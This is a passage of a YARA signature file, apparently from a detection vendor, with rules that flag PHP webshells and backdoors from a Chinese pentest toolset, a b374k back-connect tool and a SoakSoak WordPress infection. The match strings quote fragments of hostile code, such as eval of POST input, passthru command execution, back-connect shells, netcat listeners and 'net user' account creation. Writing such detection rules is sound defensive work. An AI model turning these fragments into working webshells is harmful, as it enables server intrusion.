        filesize < 641KB and all of them
}
rule Backdoor_Webshell_PHP_000450
{
    meta:
        description = "cn honker pentest toolset udf.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "<?php // Source  My : Meiam  " fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 430KB and all of them
}
rule Backdoor_Webshell_PHP_000451
{
    meta:
        description = "cn honker pentest toolset mail.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 39KB and all of them
}
rule Backdoor_Webshell_PHP_000452
{
    meta:
        description = "cn honker pentest toolset phpwebbackup.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
        $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
        
    condition:
        uint16(0) == 0x3f3c and filesize < 67KB and all of them
}
rule Backdoor_Webshell_PHP_000453
{
    meta:
        description = "cn honker pentest toolset dz_phpcms_phpbb.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "function test_1($password)" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
        $s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii
        
    condition:
        filesize < 22KB and all of them
}
rule Backdoor_Webshell_PHP_000454
{
    meta:
        description = "cn honker pentest toolset 1.gif"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "<?php eval($_POST[" ascii /* PEStudio Blacklist: strings */
        $s1 = ";<%execute(request(" ascii /* PEStudio Blacklist: strings */
        $s3 = "GIF89a" fullword ascii /* Goodware String - occured 318 times */
        
    condition:
        filesize < 6KB and 2 of them
}
rule Backdoor_Webshell_PHP_000455
{
    meta:
        description = "cn honker pentest toolset file php8.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii /* PEStudio Blacklist: strings */
        $s1 = "function startfile($path = 'dodo.zip')" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 25KB and 2 of them
}
rule Backdoor_Webshell_PHP_000456
{
    meta:
        description = "cn honker pentest toolset xx.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii /* PEStudio Blacklist: strings */
        $s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 2KB and all of them
}
rule Backdoor_Webshell_PHP_000457
{
    meta:
        description = "cn honker pentest toolset php2.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii /* PEStudio Blacklist: strings */
        $s2 = "<?php // Black" fullword ascii
        
    condition:
        filesize < 12KB and all of them
}
rule Backdoor_Webshell_PHP_000458
{
    meta:
        description = "cn honker pentest toolset php3.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 8KB and all of them
}
rule Backdoor_Webshell_PHP_000459
{
    meta:
        description = "cn honker pentest toolset php10.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii /* PEStudio Blacklist: strings */
        $s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 600KB and all of them
}
rule Backdoor_Webshell_PHP_000460
{
    meta:
        description = "cn honker pentest toolset servu.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "function ftpcmd($ftpport,$user,$password,$dir,$cmd){" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 41KB and all of them
}
rule Backdoor_Webshell_PHP_000461
{
    meta:
        description = "cn honker pentest toolset php1.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
        $s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii /* PEStudio Blacklist: strings */
        $s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 621KB and all of them
}
rule Backdoor_Webshell_PHP_000462
{
    meta:
        description = "cn honker pentest toolset php9.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 1087KB and all of them
}
rule Backdoor_Webshell_PHP_000463
{
    meta:
        description = "cn honker pentest toolset php1.txt, php7.txt, php9.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        super_rule = 1
        
    strings:
        $s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
        $s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
        
    condition:
        filesize < 300KB and all of them
}
rule Backdoor_Webshell_PHP_000464
{
    meta:
        description = "cn honker pentest toolset php4.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "nc -l -vv -p port(" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        uint16(0) == 0x4850 and filesize < 1KB and all of them
}
rule Backdoor_Webshell_PHP_000465
{
    meta:
        description = "cn honker pentest toolset ftp mysql mssql ssh.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
        $s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 20KB and 3 of them
}
rule Backdoor_Webshell_PHP_000466
{
    meta:
        description = "cn honker pentest toolset php7.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii /* PEStudio Blacklist: strings */
        $s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 300KB and all of them
}
rule Backdoor_Webshell_PHP_000467
{
    meta:
        description = "cn honker pentest toolset serv-u.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "@readfile(\"c:\\\\winnt\\\\system32\\" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "$sendbuf = \"PASS \".$_POST[\"password\"].\"\\r\\n\";" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "$cmd=\"cmd /c rundll32.exe $path,install $openPort $activeStr\";" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 435KB and all of them
}
rule Backdoor_Webshell_PHP_000468
{
    meta:
        description = "privilege escalation tool  b374k_back_connect.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-08-18"
        
    strings:
        $s1 = "AddAtomACreatePro" fullword ascii
        $s2 = "shutdow" fullword ascii
        $s3 = "/config/i386" fullword ascii
        
    condition:
        ( uint16(0) == 0x5a4d and filesize < 10KB and all of them )
}
rule Backdoor_Webshell_PHP_000469
{
    meta:
        description = "trigger_drop.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "$_GET['returnto'] = 'database_properties.php';" fullword ascii
        $s1 = "echo('<meta http-equiv=\"refresh\" content=\"0;url=' . $_GET['returnto'] . '\">'" ascii
        $s2 = "@mssql_query('DROP TRIGGER" ascii
        $s3 = "if(empty($_GET['returnto']))" fullword ascii
        
    condition:
        filesize < 5KB and all of them
}
rule Backdoor_Webshell_PHP_000470
{
    meta:
        description = "soaksoak infected wordpress site"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-12-15"
        
    strings:
        $s0 = "wp_enqueue_script(\"swfobject\");" ascii
        $s1 = "function FuncQueueObject()" ascii
        $s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii
        
    condition:
        all of ($s*)
}
